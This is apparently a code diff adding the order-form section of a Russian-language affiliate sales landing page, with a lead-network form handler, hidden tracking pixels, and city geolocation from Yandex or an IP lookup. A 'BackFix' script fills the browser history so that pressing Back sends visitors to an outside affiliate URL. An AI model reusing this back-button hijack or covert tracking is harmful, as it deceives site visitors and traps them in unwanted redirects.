@@ -1,0 +1,149 @@
+<form id="luckyshop_form" action="" class="order_form" method="post" onsubmit="validateform(this); return false;">
+  <input type="text" class="input-roulette" name="name" placeholder="Ваше имя" required id="first_name">
+  <input type="tel" class="input-roulette form_phone" name="phone" placeholder="Ваш телефон" required inputmode="tel" id="phone">
+  <input type="submit" class="submit-roulette" value="Получить за 186 рублей">
+  <small style="font-size:18px;color: black ">*Ваш заказ, перед отправкой, надежно защищен от вирусов. Все курьеры соответствуют и отвечают санитарным требованиям.</small>
+</form>
+<!--scroll-->
+<script>
+  $(function () {
+	$("a[href^='#']").click(function () {
+		var _href = $(this).attr("href");
+		$("html, body").animate({
+			scrollTop: $(_href).offset().top + "px"
+		});
+		return false;
+	});
+});
+</script>
+<!--scroll-->
+<!-- Start BackFix -->
+<script>
+! function() {
+var t;
+try {
+const URL = window.location.href.split(/[#]/)[0];
+for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#rdm' + Math.floor(Math.random() * 10))
+onpopstate = function(event) {
+var b = document.createElement("img");
+b.src='http://{domain}/click.php?event9=1';
+event.state && location.replace('https://wordtime24.ru/tn?referral=3&stream=4079&utm_source=mdom' + window.location.search);
+}
+} catch (o) {
+console.log(o);
+}
+}();
+</script>
+<!-- End BackFix -->
+
+<!--	Start Lucky-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js"></script>
+
+<script>
+  $(document).ready(function() {
+    $('input[name="phone"]').inputmask({
+      "mask": "+7(999)999-99-99"
+    });
+  });
+
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-url-parser/2.3.1/purl.min.js"></script>
+<script src="https://click.lucky.online/js/leadprofit.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $(".order_form").leadprofit({
+      hash: "14d30aa0-2864-4030-8ffd-c0a23888e387",
+      subid1: "{clickid}",
+      subid2: "pl",
+      subid3: "api"
+    }).leadprofitSubmit({
+      confirmUrl: 'confirm.html'
+    });
+  });
+
+</script>
+<!--End Lucky-->
+<!-- Common scripts -->
+<script type="text/javascript">
+  var scroll = 0;
+  window.onscroll = function() {
+    if (scroll != 1) {
+      scroll = 1;
+      var o = document.createElement("img");
+      o.src = "https://{domain}/click.php?event6=1";
+    }
+  }
+
+</script>
+
+<script>
+  function pushToTrackerViaImage() {
+    var pushURL = 'https://{domain}/click.php?event7=1';
+    var img = document.createElement('img');
+    img.src = pushURL;
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  }
+
+  function pushAfterTimeout(timeout) {
+    setTimeout(pushToTrackerViaImage, timeout * 1000);
+  }
+  var TIMEOUT_IN_SECONDS = 30;
+  pushAfterTimeout(TIMEOUT_IN_SECONDS);
+
+</script>
+
+<script>
+  if (typeof(window.orientation) == "undefined") {
+    var o = document.createElement("img");
+    o.src = 'https://{domain}/click.php?event8=0';
+  } else {
+    var o = document.createElement("img");
+    o.src = 'https://{domain}/click.php?event8=1';
+  }
+
+</script>
+
+<!-- End Common scripts -->
+<!--	geo-->
+<script src="https://api-maps.yandex.ru/2.0/?load=package.standard&lang=ru-RU" type="text/javascript"></script>
+<script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function() {
+    ymaps.ready(function() {
+      var e, n = ymaps.geolocation,
+        t = document.getElementsByClassName("user-city");
+      for (e = 0; e < t.length; e++) t[e].innerHTML = "" + n.city
+    })
+  });
+
+</script>
+<!--	geo-->
+<!--  geo-->
+<script src="https://api-maps.yandex.ru/2.0/?load=package.standard&lang=ru-RU" type="text/javascript"></script>
+  <script>
+    window.onload = function() {
+      var userCity = $(".user-city");
+
+      function checkCity(city) {
+        if (!city) {
+          return 'Киев'
+        }
+        return city;
+      }
+      if (window.ymaps) {
+        userCity.text(checkCity(ymaps.geolocation.city));
+      } else {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://click.lucky.online/click/ip-location.html', false);
+        xhr.send();
+        if (xhr.status != 200) {
+          userCity.text(checkCity(null));
+        } else {
+          var response = JSON.parse(xhr.responseText);
+          userCity.text(checkCity(response.city));
+        }
+      }
+    };
+  </script>
+<!--  geo-->
